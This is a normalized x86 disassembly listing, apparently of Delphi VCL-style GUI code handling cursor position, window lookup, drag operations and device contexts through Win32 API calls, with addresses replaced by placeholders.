movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43e5a4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43d7d0
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_4486c4
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43e2d4
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43e714
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43e8b9
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403448
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403448
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43dad8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43e5a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d9c0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_446be4
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_418ddc
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_43fedc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_418ddc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_43e8d8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403448
mov ebx eax
sub_43e94c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_43ec18
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_43eba6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_43d818
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033fc
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_43e8d8
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_43e204
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_448820
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ebad
mov eax [ rw-data ]
call sub_40324c
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_457218
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_441578
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_43e0d0
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_45ae84
sub_43ebad
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4033d8
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
sub_43ec3c
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43d2a4
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43ec70
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43ec3c
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_43ff08
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_444498
test eax eax
je r-xdata
mov esi eax
sub_43ecb8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41a0dc
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebx ] eax
sub_43ece0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_41a37c
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_40324c
xor eax eax
mov [ ebx ] eax
sub_43ed00
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43ed30
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_41a5a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43ede0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_43edb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43ef6c
call sub_403a84
call sub_403a84
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a238
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_423d04
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_43edec
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a5a4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43ee8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ee91
mov eax [ rw-data ]
call sub_41a608
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_43ee62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43ef6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_423d60
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a238
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_423d04
test al al
je r-xdata
sub_43ee98
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_43ef6c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423934
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_43eec4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_423ee4
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_423ee8
mov eax [ ebp - 0x4 ]
call sub_43efb8
mov eax [ rw-data ]
call sub_41a5a4
mov ebx eax
xor eax eax
push ebp
push sub_43ef49
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41a0dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a608
retn
call sub_43ed30
sub_43ef6c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_423ee8
mov edx ebx
mov eax [ rw-data ]
call sub_41a5b8
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_43efb8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_440a08
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_43efe4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40321c
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43f020
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41a8c0
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_43f068
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_43f124
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43f1f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f1f8
lea eax [ ebp - 0x1c ]
call sub_403f9c
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403448
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44f8ec
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408fcc
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403ff0
sub_43f214
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43f27b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44c9b8
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_4403c4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov edx [ eax + 0x64 ]
pop eax
call sub_4043a8
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43f282
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
mov al 0x1
sub_43f288
push ebx
mov ebx eax
mov eax ebx
call sub_44c9e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f2bc
push ebx
mov ebx eax
mov eax ebx
call sub_44ca30
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4043a8
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f2f4
push ebx
mov ebx eax
mov eax ebx
call sub_44ca6c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f328
push ebx
mov ebx eax
mov eax ebx
call sub_4204c8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43f350
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4403f4
sub_43f370
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43f390
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403ff0
sub_43f3b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4402e4
sub_43f3d2
mov eax eax
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43f400
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4043a8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033fc
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43f464
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43fd40
sub_43f484
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43fd2c
sub_43f4a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43f4c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41fbd8
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d80
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_440474
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43efe4
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_441338
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_43f59c
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035d8
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45ed9c
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c0
push edi
xor ecx ecx
mov edx 0xb039
call sub_441578
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43fd64
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403448
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_40324c
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_40324c
mov eax [ edi + 0x68 ]
call sub_40324c
mov eax [ edi + 0x64 ]
call sub_408b3c
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41fc24
test bl bl
jle r-xdata
sub_43f668
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43f690
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403448
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
